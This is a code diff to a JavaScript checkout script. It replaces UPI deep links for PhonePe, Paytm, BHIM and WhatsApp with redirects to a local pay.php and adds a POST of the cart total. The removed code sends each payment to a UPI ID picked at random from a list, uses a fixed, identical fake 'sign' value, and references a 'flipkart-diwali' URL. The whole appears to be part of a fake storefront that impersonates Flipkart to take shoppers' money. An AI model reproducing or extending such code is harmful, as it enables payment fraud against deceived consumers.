@@ -927,6 +927,26 @@ document.addEventListener('DOMContentLoaded', function() {
         var randomIndex = Math.floor(Math.random() * upis.length);
         var upiId = upis[randomIndex];
         let amt = parseFloat(localStorage.getItem("cartTotalAmount"));
+      // Prepare the POST data using URLSearchParams
+const postData = new URLSearchParams();
+postData.append("amount", amt);
+
+// Use the fetch API to POST the data
+fetch('process_payment.php', {
+    method: 'POST',
+    headers: { 
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: postData.toString()
+})
+.then(response => response.text())
+.then(data => {
+    console.log("Server response:", data);
+    // Optionally, handle any UI updates or redirection based on the response
+})
+.catch(error => {
+    console.error("Error posting amount:", error);
+});
 
         switch (payType) {
             case 'net_banking':
@@ -937,24 +957,24 @@ document.addEventListener('DOMContentLoaded', function() {
                 break;
                 
             case 'phonepe':
-                 redirect_url = "phonepe://pay?pa=" + upiId + "&pn=" + site_name + "&am=" + amt + "&tr=&mc=8999&cu=INR&tn=" + txn_id  + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr";
-                break;
+                 redirect_url = "./pay.php";
+            break;
             case 'paytm':
-                redirect_url = "paytmmp://cash_wallet?pa=" + upiId + "&pn=" + site_name + "&am=" + amt + "&tr=&mc=8999&cu=INR&tn=" + txn_id + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr&featuretype=money_transfer";
-                break;
+                redirect_url = "./pay.php";
+            break;
             case 'bhim_upi':
-                redirect_url = "upi://pay?pa=" + upiId + "&pn=" + site_name + "&am=" + amt + "&tr=&mc=8999&cu=INR&tn=" + txn_id + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr";
-                break;
+                redirect_url = "./pay.php";
+            break;
             case 'whatspp_pay':
-                redirect_url = "whatsapp://pay?pa=" + upiId + "&pn=" + site_name + "&am=" + amt + "&tr=&mc=8999&cu=INR&tn=" + txn_id + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr";
-                break;
+                redirect_url = "./pay.php";
+            break;
         }
 
         $.ajax({
             type: "post",
-            url: "https://flipkart-diwali/payment/purchase",
+            url: "./pay.php",
             data: {
-                "payType": payType
+                "amount": amt
             },
             success: function(response) {}
         });
